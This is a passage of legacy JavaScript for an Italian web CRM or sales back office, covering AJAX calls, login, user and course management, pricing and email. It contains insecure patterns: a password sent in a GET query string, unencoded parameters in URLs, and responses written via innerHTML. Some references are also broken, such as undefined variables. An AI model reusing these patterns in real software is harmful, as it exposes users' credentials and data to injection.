
var regeffettuata=false;
var winvocale1;
var winvocisCreate=false;
var tabcontract=null;
var tabiscreate=false;
var ajax;
var hostname = "localhost";
// VARIABILE CHE VIENE VALORIZZATA IN ATTESA DI ESITO
var withoutExit  = false; // senza esito
var caseContract = false;
var inmodifica = false;




function getXmlHttpObject()
{

    try
    {
        // Firefox, Opera 8.0+, Safari
        ajax=new XMLHttpRequest();
    }
    catch (e)
    {
        // Internet Explorer
        try
        {
            ajax=new ActiveXObject("Msxml2.XMLHTTP");
        }
        catch (e)
        {
            ajax=new ActiveXObject("Microsoft.XMLHTTP");
        }
    }
    return ajax;
}
function imposeMaxLength(Object, MaxLen)
{
    return (Object.value.length <= MaxLen);
}
function disabledelement(){
  //  alert("sonoqui");
    document.getElementById('caseselect').disabled=true;//="hidden";
     document.getElementById('tornaindietro').disabled=true;

}
function enableelement(){
  //  alert("sonoqui");
    document.getElementById('caseselect').disabled=false;//="hidden";
     document.getElementById('tornaindietro').disabled=false;

}
//IVA
function CalcolaIVA()
{
    Applica=1;
    Imponibile=document.getElementById('prezzo').value;
    if (Applica == 0)
    {
        document.getElementById('prezzoiva').value= Imponibile;
    }
    else
    {
        document.getElementById('prezzoiva').value= (Imponibile*1) + (((Imponibile * 21) / 100)*1);
    }
}

//STORICO
function getStorico(){
    var id  = document.getElementById("CodCli").value;
    var url = "";

       url = "function/ajax.php?storico=true&id_customer="+id;
   


    if(id != ""){
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = printStorico;
            ajax.open("GET",url);
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }
    }
    else {
        window.alert("Per visualizzare lo storico devi contattare un cliente");
    }
}
function ordertablenew(id,tipo){
   //  alert(tipo);
     if(tipo=='desc' || tipo==''){
 window.location.href="pageassegnarichieste.php?ordinamento=true&campo="+id+"&tipo=asc";
}
else window.location.href="pageassegnarichieste.php?ordinamento=true&campo="+id+"&tipo=desc";


}
function printStorico(){
    var response = "";
    if(ajax.readyState == 4){
        response = ajax.responseText;
        if(response != "null"){
           document.getElementById("storico").innerHTML=response;
        }
        else {
            window.alert("Nessuno storico chiamate per questo cliente");
        }
    }
}

function getToday(format){
    var data = new Date();

    var giorno = data.getDate();
    if(giorno < 10){
        giorno = "0"+giorno;
    }
    var mese   = data.getMonth()+1;
    if(mese < 10){
        mese = "0"+mese;
    }
    var anno   = data.getFullYear();

    if(format == "ita"){
        stringData = giorno+"/"+mese+"/"+anno;
    }
    else {
        stringData = anno+"-"+mese+"/"+giorno;
    }
    return stringData;
}

function editForm(id_form){

    if(!inmodifica){
        inmodifica   = true;
        lastFormEdit = id_form;
        // mostro/nascondo relative icone
        document.getElementById("mod_"+id_form).style.display  = "none";
        document.getElementById("undo_"+id_form).style.visibility = "visible";
        document.getElementById("save_"+id_form).style.visibility = "visible";
        var form     = document.getElementById(id_form);
        var numCampi = form.length;
     
        var elements = form.elements;
        for(i = 0; i < numCampi; i++){
            var tmpid   = elements[i].id;
            var tmptype = elements[i].type;
            if((tmptype != "hidden") || (tmptype != "")){
//   alert(tmpid);
                document.getElementById(tmpid).style.border = "solid 1px #ffa20c";
                if(tmptype == "text" ){
                    document.getElementById(tmpid).readOnly  = false;
                }
                else if(tmptype == "textarea" ){
                    document.getElementById(tmpid).readOnly  = false;
                }
                else if(tmptype == "checkbox" ){
                    document.getElementById(tmpid).setAttribute("disabled", "");
                }
                else {
                    document.getElementById(tmpid).setAttribute("disabled", "");
                }

                     if(tmptype == "text"){
                    document.getElementById(tmpid).select();
                  
               }
            }
        }
    }
    else {
        window.alert("Altri campi risultano attualmente in modifica.\nPer editare e' necessario\nannullare o salvare i campi attualmente attivi.");
    }
}



function Left(str, n){
	if (n <= 0)
	    return "";
	else if (n > String(str).length)
	    return str;
	else
	    return String(str).substring(0,n);
}
function Right(str, n){
    if (n <= 0)
       return "";
    else if (n > String(str).length)
       return str;
    else {
       var iLen = String(str).length;
       return String(str).substring(iLen, iLen - n);
    }
}

function visibileelement(){
      document.getElementById("fckedit").style.visibility="visible";
    document.getElementById("fckedit").style.display="block";
}
function hiddenfck(){
      document.getElementById("fckedit").style.visibility="hidden";
    document.getElementById("fckedit").style.display="none";
}



function infovisibility(id){
    imag=document.getElementById('imgdett').src;
    strimages=Right(imag,12);
    //alert(strimages);
    if (strimages=="moreinfo.png"){
    document.getElementById(id).style.visibility="visible";
    document.getElementById(id).style.display="block";
    document.getElementById('imgdett').src="./images/menoinfo.png";
    }
    else
{
    document.getElementById(id).style.visibility="hidden";
    document.getElementById(id).style.display="none";
    document.getElementById('imgdett').src="./images/moreinfo.png";

}

}
function getComune(select,idsel,namesel,idtd){

    var prov = select.value;
    var id   = select.id;
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;

                document.getElementById(idtd).innerHTML = response;
            }
        };
        ajax.open("GET", "function/ajax.php?get_comuni=true&provincia="+prov+"&id_select="+idsel+"&name_select="+namesel);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}
function InsertExtra(tipo){
     error = false;
      var array1 = new Array(3);
    array1[0] = "nome";
    array1[1] = "cognome";
    array1[2] = "telefono";
     array1[3] = "email";
array1[4] = "form_provenienza";
array1[5] = "areainteresse";

//  primo controllo
    for(i=0;i<array1.length;i++){
        if(document.getElementById(array1[i]) != null){
            var tmp_value = document.getElementById(array1[i]).value;
            if(tmp_value.length == 0){
                if (document.getElementById(array1[i]).name=="input"){
                    document.getElementById(array1[i]).style.background="red";
                    document.getElementById(array1[i]).style.color="white";
                }
                else document.getElementById(array1[i]).style.border = "solid 1px red";
                error = true;
            //  break;
            }
        }
    }



    if(!error){
        // non ci sono errori nell'ultimo tab

            if (window.confirm("Procedo con inserimento dati")){
    query="extra=true&tipo="+tipo+"&";


    var frm=document.forms.formextra;
    var nelementi=frm.elements.length;

    //winAppointment.window('persAppointment').park();
    for (var i=0; i<nelementi; i++){
        //   if (encodeURIComponent(frm.elements[i].value)=""){


        if (i<nelementi-1){
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value)+"&";
            }
        //    else  {
          //      query+=frm.elements[i].name+"=" +"0&";
          //  }

        // query+=frm.elements[i].name+"="+frm.elements[i].value+"&";
        }
        else {
            if (encodeURIComponent(frm.elements[i].value)!=""){

                query+=frm.elements[i].name+"="+encodeURIComponent(frm.elements[i].value);
            }
      //      else query+=frm.elements[i].name+"=0";
        //query+=frm.elements[i].name+"="+frm.elements[i].value;
        }
    //  }
    }
//      alert(query);
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = resultpostextra;
        ajax.open("POST","function/ajax.php",true);
        ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
        ajax.send(query);
    }

		}


    }
    else window.alert("Bisogna valorizzare tutti i campi obbligatori");





}
function resultpostextra (){
    var response = "";

    if(ajax.readyState == 4)
    {
        response = ajax.responseText;
//        alert(response);
           window.location.href="index.php";
  //       alert(response);
        //document.getElementById("note").value=response;
       // if(response == "ok")
        //{
  //          select=document.getElementById('esito_chiamata2').value;
          //  alert(select);
    //          document.getElementById("div_appuntamento").style.display = "block";
      //          doOpacity('div_appuntamento');
           // doExitContrateClosed(select);

            //alert("Dati Inseriti Correttamente");

            //UPDATE ESITO CHIAMATA COME CONTRATTO
        // document.location.reload();
       // }
        //else {
         //   alert(response);
        // alert("Attenzione Inserimento non riuscito Correttamente")
        //}

    }
}


function ViewHistory(){
 //   alert("vt_report_index");
       window.location.href="stampa_contratti.php";
}

function showpagestatistiche(){
 //   alert("vt_report_index");
     //  window.location.href="vt_report.php";
        window.location.href="viewcalendarsale.php";
}
function showpagemappa(){
 //   alert("vt_report_index");
       window.location.href="mappapp.php";
}
function showpageuser(){
 //   alert("vt_report_index");
       window.location.href="vt_user.php";
}

function showappfilter(){
     var testo=document.getElementById('ricerca').value;
    // var tipo=document.getElementById('rd2').value;
     if(testo!=''){
 window.location.href="index.php?ricerca=true&testo="+testo;
    
}


 else alert("Attenzione inserire il testo!");
    
}




function showappfilterfatt(){
     var testo=document.getElementById('ricerca').value;
     if(testo!=''){
 window.location.href="pagefatture.php?ricerca=true&testo="+testo;

}
 else alert("Attenzione inserire il testo!");

}
function showappfilteradmin(){
     var testo=document.getElementById('ricerca').value;
     if(testo!=''){
 window.location.href="pageassegnarichieste.php?ricerca=true&testo="+testo;

}
 else alert("Attenzione inserire il testo!");

}
function showappfilteradminvend(){
     var testo=document.getElementById('ricerca').value;
     if(testo!=''){
 window.location.href="pageassegnarichiestexvend.php?ricerca=true&testo="+testo;

}
 else alert("Attenzione inserire il testo!");

}

function showappfilterconta(){
     var testo=document.getElementById('ricerca').value;
     if(testo!=''){
 window.location.href="pagevisualizzapagamenti.php?ricerca=true&testo="+testo;

}
 else alert("Attenzione inserire il testo!");

}

function azzerafilterfatt(){
     var testo=document.getElementById('ricerca').value;
     //var tipo=document.getElementById('rd2').value;
    window.location.href="pagefatture.php";

}

function showpagechiamata(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="index.php";
                   
                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}
function showpagechiamataagenda(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="viewcalendarVT.php";
                   
                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

function showpagechiamatatrattativa(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="control_trattativa.php";
                   
                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

function showpagechiamataok(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="control_ok.php";
                   
                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}
function showpagechiamatako(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="control_ko.php";
                   
                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

function showpagechiamatacont(){


        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                               window.location.href="pagevisualizzapagamenti.php";

                }
            };
            ajax.open("GET", "function/ajax.php?cruscotto=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

//SALVA TEL

function salva_tel(){

telefono=document.getElementById('phonetelefono').value;
id_contatto=document.getElementById('CodCli').value;
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                        alert(response);
                             //  window.location.href="pagevisualizzapagamenti.php";

                }
            };
            ajax.open("GET", "function/ajax.php?salvatel=true&telefono="+telefono+"&idrichiesta="+id_contatto);
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}
function salva_telconta(){

telefono=document.getElementById('phonetelefono').value;
id_contatto=document.getElementById('idadesione').value;
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                        alert(response);
                             //  window.location.href="pagevisualizzapagamenti.php";

                }
            };
            ajax.open("GET", "function/ajax.php?salvatelconta=true&telefono="+telefono+"&idrichiesta="+id_contatto);
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}



function showpagecruscotto(){
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                   // if(response == 1){
                        var height = screen.availHeight-80;
                        var width  = screen.width;
                    window.location.href="index.php";
                    
                }
            };
            ajax.open("GET", "function/ajax.php?cruscottono=true");
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }


}

function delnews(idnews){
          if (window.confirm("Procedo con la Cancellazione della news?")){

        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                    alert(response);
                   // if(response == 1){
                     
                    window.location.href="pageavisualizzanews.php";

                }
            };
            ajax.open("GET", "function/ajax.php?delnews=true&id_news="+idnews);
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }

          }
}



function getSconto(select){

    var prov = select.value;
    var id   = select.id;
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;

                document.getElementById("td_sconto").innerHTML = response;
                gettdcorso(select,prov);
            }
        };
        ajax.open("GET", "function/ajax.php?getsconto=true&idcorso="+prov);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}

function opz1mobile(select){

    var prov = select.value;
    var id   = select.id;
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;

                document.getElementById("td_sconto").innerHTML = response;
                gettdcorso(select,prov);
            }
        };
        ajax.open("GET", "function/ajax.php?getsconto=true&idcorso="+prov);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}


function clickallegati(elemento,id){
    if (elemento.checked){

    }
}

function getnsim(select){

    var prov = select.value;
  //  var id   = select.id;
   // alert(select);
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;
//alert(response);
                document.getElementById("getpianogenericosim").innerHTML = response;
       // getprezzo(idcorso)   ;
        }
        };
        ajax.open("GET", "function/ajax.php?getpianosim=true&idparent="+prov);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}

function findpianoforsim(select){

    var prov = select;
  //  var id   = select.id;
   // alert(select);
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;
//alert(response);
                document.getElementById("getpianoforsim").innerHTML = response;
       // getprezzo(idcorso)   ;
        }
        };
        ajax.open("GET", "function/ajax.php?getpianoforsim=true&idparent="+prov);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}



function gettdcorso(select,idcorso){

    var prov = select.value;
    var id   = select.id;
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;
//alert(response);
                document.getElementById("dettagliocorso").innerHTML = response;
        getprezzo(idcorso)   ;
        }
        };
        ajax.open("GET", "function/ajax.php?dettagliocorso=true&idcorso="+idcorso);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}
//function saldo()
function getprezzo(idcorso){
//alert(idcorso);
    //   resetStyle(select);
    // ------------------
quantita=document.getElementById('quantita').value;
//alert(quantita);
ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;
//alert(response);

                document.getElementById("prezzo").value = response.replace(/^\s+/,"").replace(/\s+$/,"");;
                document.getElementById('prezzoiva').value=(response*1)+(((response*21)/100)*1);
        //getprezzo(idcorso)   ;
        }
        };
        ajax.open("GET", "function/ajax.php?getprezzo=true&idcorso="+idcorso+"&quantita="+quantita);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}

function confrontoDate(data1ita,data2ita){
    // se il risultato è 1 la prima data è anteriore alla seconda, 2 il contrario
    var result;
    var anno1   = parseInt(data1ita.substr(6),10);
    var mese1   = parseInt(data1ita.substr(3, 2),10);
    var giorno1 = parseInt(data1ita.substr(0, 2),10);

    var anno2   = parseInt(data2ita.substr(6),10);
    var mese2   = parseInt(data2ita.substr(3, 2),10);
    var giorno2 = parseInt(data2ita.substr(0, 2),10);

    if(giorno1 > giorno2 || mese1 > mese2 || anno1 > anno2){
        result = 2;
    }
    else {
        result = 1;
    }
    return result;

}

function getDatetime(){
    var data = new Date();
    var giorno = data.getDate();
    if(giorno < 10){
        giorno = "0"+giorno;
    }
    var mese   = data.getMonth()+1;
    if(mese < 10){
        mese = "0"+mese;
    }
    var anno   = data.getFullYear();
    var ora    = data.getHours();
    if(ora<10){
        ora = "0"+ora;
    }
    var minuti = data.getMinutes();
    if(minuti<10){
        minuti = "0"+minuti;
    }
    var secondi= data.getSeconds();
    if(secondi<10){
        secondi = "0"+secondi;
    }

    return anno+"-"+mese+"-"+giorno+" "+ora+":"+minuti+":"+secondi;
}

function testoperemail(select){
   
 var id= select.value;
//alert(id);
//alert(select);
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;

               document.getElementById("eEditorArea").value = response;
            }
        };
        ajax.open("GET", "function/ajax.php?get_testoemail="+id);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}

function PressOnlyNumber(e)
{
if(window.event)
num = window.event.keyCode; // IE
else
num = e.which; // Firefox

//var num = window.event.keyCode;
//alert(num);
switch(num)

{
//tastiera principale
case 48:return true;
case 49:return true;
case 50:return true;
case 51:return true;
case 52:return true;
case 53:return true;
case 54:return true;
case 55:return true;
case 56:return true;
case 57:return true;
//tastiera a destra
case 96:return true;
case 97:return true;
case 98:return true;
case 99:return true;
case 100:return true;
case 101:return true;
case 102:return true;
case 103:return true;
case 104:return true;
case 105:return true;
    default:
return false;
}
}





function inviaemail(elementi){
//    alert(elementi);
//invio=elementi;
// if (checkEmail){
var invio="";
 //var testo=document.getElementById('testoemail').value;
 var testo = FCKeditorAPI.GetInstance('FCKeditor1').GetHTML();
 var oggetto=document.getElementById('oggetto').value;
 var email=document.getElementById('emailagg').value;
 arrayelemeti=elementi.split(",");
 //alert(arrayelemeti.length);
 for (i=0;i<arrayelemeti.length;i++){
 //    alert(arrayelemeti[i]);
     idsel="id_"+arrayelemeti[i];
   //  alert(arrayelemeti[i]);
    // documentosel=;
    if (arrayelemeti[i]!=''){
     if (document.getElementById(idsel).checked){
         invio=invio+arrayelemeti[i]+",";
     } 
 } 
 }
 
//alert(invio);
//alert(select);
    //   resetStyle(select);
    // ------------------
    ajax = getXmlHttpObject();
    if(ajax) {
        ajax.onreadystatechange = function(){
            var response = "";
            if(ajax.readyState == 4){

                response = ajax.responseText;

               document.getElementById("testoemail").value = response;
            }
        };
        ajax.open("GET", "function/ajax.php?inviaemail="+escape(testo)+"&alleg="+invio+"&email="+email+"&oggetto="+oggetto);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
 //}
// else alert("ATTENZIONE EMAIL ERRATA");
}


function checkEmail() {
var email = document.getElementById('emailfatt');
var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
if (!filter.test(email.value)) {
alert('controlla  indirizzo email');
email.focus
return false;
}
}

function checklogin(login,password){
    //alert(login);
    //alert(password);
    ajax = getXmlHttpObject();
    // alert(ajax);
    if(ajax) {
        //var id_operatore=document.getElementById("id_operatore").value;
        ajax.onreadystatechange = resultLogin;
        //  alert("./function/ajax.php?login="+login+"&password="+password);
        ajax.open("GET", "./function/ajax.php?login="+login+"&password="+password);
        ajax.send(null);
    }
    else {
        document.write("Impossibile caricare il Componente xmlhttprequest");
    }
}
var dhxWins;
function createPopUp(id,x,y,width,height,headerText,inclusion,resize,move){


    // oggetto
    dhxWins = new dhtmlXWindows();
    // directory delle immagini
    dhxWins.setImagePath("codebase/imgs/");
    /* parametri relativi all'ancoraggio della pagina
      //  dhxWins.enableAutoViewport(false);
      //  dhxWins.attachViewportTo(inclusion);
      */
    // istanza della window
    dhxWins.createWindow(id, x, y, width,height);
    // skin
    dhxWins.setSkin("clear_blue");
    // inserisco l'header
    dhxWins.window(id).setText("<span style='font-size:12px'>"+headerText+"</span>");
    // setto la posizione
    //  dhxWins.window(id).setPosition(200, 300);
    // inserisco il conenuto degli appuntamenti


    // dhxWins.window(id).attachObject(inclusion);
    dhxWins.window(id).center();
    dhxWins.window(id).attachURL(inclusion,false);
    if(!resize){
        // nego il resize
        dhxWins.window(id).denyResize();
    }
    if(!move){
        // nego il movimento
        dhxWins.window(id).denyMove();
    }

    // nascondo la finestra all'avvio
    // dhxWins.window(id).hide();

    // per nascondere un pulsante
    //dhxWins.window(id).button("close").hide();

    // intercetto l'evento close
    dhxWins.window(id).button("close").attachEvent("onClick",function() {
        dhxWins.window(id).hide();
    });

//return dhxWins;

}
function validateEmail(elementValue){
	var emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$/;
        if (!emailPattern.test(elementValue))
        {
        	//alert("Indirizzo email non valido!");
        	return 1;
        } else return 0;
}

function isEmail(email,div){
if ( validateEmail(email) == 1 ) {
alert("Inserire un indirizzo e-mail valido")
return false;}
 else doOpacity(div); 
}


var isCreate=false;
var opacity = 1;
var tmpid;
function doOpacity(id)
{

    tmpid = id;
    document.getElementById(id).style.visibility = "visible";
    document.getElementById(id).style.display = "block";
    if(opacity < 10){
        document.getElementById(id).style.opacity = "0."+opacity;
        document.getElementById(id).style.filter="Alpha(Opacity="+opacity+"0)";
        opacity++;
        setTimeout("javascript:doOpacity(tmpid);",30);
    }
    if(opacity==10){
        if(id=="div_appuntamento"){
            document.getElementById("table_appuntamento").style.visibility="visible";
            document.getElementById("table_appuntamento").style.display="block";
        }
        if(id=="div_note"){
            document.getElementById("table_note").style.visibility="visible";
            document.getElementById("table_note").style.display="block";
        }
        if(id=="div_email"){
            document.getElementById("table_email").style.visibility="visible";
            document.getElementById("table_email").style.display="block";
        }

        if(id=="div_note_cliente"){
            document.getElementById("table_note_cliente").style.visibility="visible";
            document.getElementById("table_note_cliente").style.display="block";
        }
        if(id=="buttons"){
            document.getElementById("buttons").style.visibility="visible";
            document.getElementById("buttons").style.display="block";
            setTimeout("opacity = 1",1000);
        }
        if(id=="div_esito"){
            document.getElementById("table_esito").style.visibility="visible";
            document.getElementById("table_esito").style.display="block";
        }
          if(id=="div_bonifico"){
            document.getElementById("table_bonifico").style.visibility="visible";
            document.getElementById("table_bonifico").style.display="block";
        }
    }
}
function delOpacity(id)
{
    tmpid = id;
    if(opacity > 0){
        opacity--;
        document.getElementById(tmpid).style.opacity = "0."+opacity;
        document.getElementById(tmpid).style.filter="Alpha(Opacity="+opacity+"0)";
        setTimeout("javascript:delOpacity(tmpid);",20);
    }
    if(opacity == 0){
        if(id=="div_appuntamento"){
            document.getElementById("table_appuntamento").style.visibility="hidden";
            document.getElementById("table_appuntamento").style.display="none";
        }
        if(id=="div_note"){
            document.getElementById("table_note").style.visibility="hidden";
            document.getElementById("table_note").style.display="none"
        }
        if(id=="div_note_cliente"){
            document.getElementById("table_note_cliente").style.visibility="hidden";
            document.getElementById("table_note_cliente").style.display="none"
        }
        if(id=="div_esito"){
            document.getElementById("table_esito").style.visibility="hidden";
            document.getElementById("table_esito").style.display="none"
        }
           if(id=="div_email"){
            document.getElementById("table_email").style.visibility="hidden";
            document.getElementById("table_email").style.display="none"
        }
         if(id=="div_bonifico"){
            document.getElementById("table_bonifico").style.visibility="hidden";
            document.getElementById("table_bonifico").style.display="none"
        }

        document.getElementById(id).style.visibility = "hidden";
    }
}
chiamante=window;
function showdet(id_richiesta){
   
            window.location.assign("CVcustomerdet.php?richiesta="+id_richiesta);

}

function modnews(id_news){
        window.location.assign("CVmodinsertnews.php?id_news="+id_news);

}

function insnews(id_news){
        window.location.assign("CVmodinsertnews.php");

}

function deluser(iduser){
          if (window.confirm("Procedo con la Cancellazione ?")){

        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
                var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;
                    alert(response);
                   // if(response == 1){

                    window.location.href="pageaadduser.php";

                }
            };
            ajax.open("GET", "function/ajax.php?deluser=true&idlogin="+iduser);
            ajax.send(null);
        }
        else {
            document.write("Impossibile caricare il Componente xmlhttprequest");
        }

          }
}

function moduser(iduser){
        window.location.assign("CVmoduser.php?idlogin="+iduser);

}
function modcorso(iduser){
        window.location.assign("CVmodcorso.php?idcorso="+iduser);

}

function moddettaglicorso(iduser){
        window.location.assign("CVmodificadettcorso.php?iddettcorso="+iduser);

}
function detailscorso(iduser,nomecorso){
        window.location.assign("CVmoddetcorso.php?idcorso="+iduser+"&nomecorso="+nomecorso);

}

function addnewuser(){
        window.location.assign("CVmoduser.php");

}
function addnewcorso(){
        window.location.assign("CVmodcorso.php");

}
function addnewdettcorso(idcorso){
        window.location.assign("CVmodificadettcorso.php?idcorso="+idcorso+"&new=true");

}

function showdetpagamenti(id_adesione,id_richiesta){
   
            window.location.assign("CVcustomerdetpagamenti.php?id_contratto="+id_adesione+"&id_richiesta="+id_richiesta);

}

function shownewsadmin(){
            window.location.assign("pageavisualizzanews.php");

}
function adduser(){
            window.location.assign("pageaadduser.php");

}
function addcorsi(){
            window.location.assign("pageaaddcorsi.php");

}

function showdetfatture(id_adesione,id_richiesta){
   
            window.location.assign("CVcustomerdetfatture.php?id_contratto="+id_adesione+"&id_richiesta="+id_richiesta);

}



function addextradb(tipo){
   
            window.location.assign("addextra.php?tipo="+tipo);

}
//function addextradb(){

  //          window.location.assign("addextra.php");

//}


function resultLogin(){
    var response = "";
    if(ajax.readyState == 4){
        response = ajax.responseText;

      //  alert(response);
        if(response == "ok"){

            window.location.assign("report_contract.php");
        }
        else window.location.assign("index.php?login=falso");
    }
}

function doExitpag(select){

    var value  = select.value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
  //  alert(id_esito);
    var CodCli=document.getElementById('CodCli').value;
    var idlogin=document.getElementById('idlogin').value;
   // var stato=document.getElementById('stato').value
//var note_chiamata=document.getElementById("note_della_chiamata").value;
//var priorita=document.getElementById("priorita").value;
//alert("note_chiamata");
    if (!isNaN(id_esito)){
    //alert(stato);
    //   window.alert("tipologia: "+tipologia+" esito:"+id_esito);
    var id  = select.id;
    var index    = document.getElementById(id).selectedIndex;
    //alert(index);
    var option   = select.options[index];
    //alert(option);
    var text     = option.text;

     //  alert(id_esito);

 //   if (id_esito>=12){
        //           document.getElementById("caseselect2").style.visibility = "hidden";

        //      document.getElementById("docontractdiv").style.display="block";
        //        document.getElementById("docontractdiv").style.visibility="visible";
        if (id_esito==33){
            //alert("sonoqui");
            // document.getElementById("docontractdiv"o).innerHTML=include_once("contratto.php");;
            document.getElementById("docontractdiv").style.display="block";
            document.getElementById("docontractdiv").style.visibility="visible";
            document.getElementById("doinfoaggdiv").style.display="none";
            document.getElementById("doinfoaggdiv").style.visibility="hidden";
            document.getElementById("imgdett").style.visibility="hidden";


        }
    else {
        ajax = getXmlHttpObject();
        if(ajax) {
            ajax.onreadystatechange = function(){
               // var response = "";
                if(ajax.readyState == 4){
                    response = ajax.responseText;

                    window.location.href="index.php";


                }

            }
            ajax.open("GET","function/ajax.php?esita_contatto="+id_esito+"&dialer_data="+dialer_data+"&id_richiesta="+CodCli+"&idlogin="+idlogin+"&stato="+stato+"&note_chiamata="+note_chiamata);
            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
            ajax.send(null);
        }
    }
   
//   }
    }
}



function doExit(select){

    var value  = select.value;
    // alert(value);
    var arr_value = value.split(':');
    var dialer_data = arr_value[0];
    //dialer_data = parseInt(tipologia);
    var id_esito = arr_value[1]; // document.getElementById(id).value;
    id_esito = parseInt(id_esito);
